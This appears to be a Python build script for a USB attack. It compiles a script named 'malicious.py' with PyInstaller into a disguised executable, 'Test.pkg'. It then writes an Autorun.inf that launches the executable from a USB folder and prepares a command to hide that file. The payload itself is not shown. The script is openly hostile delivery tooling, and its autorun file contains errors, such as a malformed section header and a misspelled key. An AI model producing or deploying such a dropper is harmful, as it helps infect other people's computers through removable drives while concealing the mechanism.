#!/usr/local/bin/python3
import PyInstaller.__main__
import shutil
import os

filename="malicious.py"
exename="Test.pkg"
icon="layer.ico"
pwd=os.getcwd()
usbdir=os.path.join(pwd,'USB')

if os.path.isfile(exename):
    os.remove(exename)

# create exe from py script
print("Creating file")
PyInstaller.__main__.run([
    "malicious.py",
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name="+exename
])
print("EXE Created")

# Rest of your code...

shutil.move(os.path.join(pwd,"dist",exename),pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
if os.path.exists("__pycache__"):
    shutil.rmtree("__pycache__")
os.remove(exename+".spec")

print("Creating Autorun file")
with open("Autorun.inf","w") as o:
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n")
    o.write("Action=Start Test Portable\n")
    o.write("Lable=My USB\n")
    o.write("Icon="+exename+"\n")

shutil.move(exename,usbdir)
shutil.move("Autorun.inf",usbdir)
print("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
# os.system("attrib +h "+os.path.join(usbdir,"Autorun.inf"))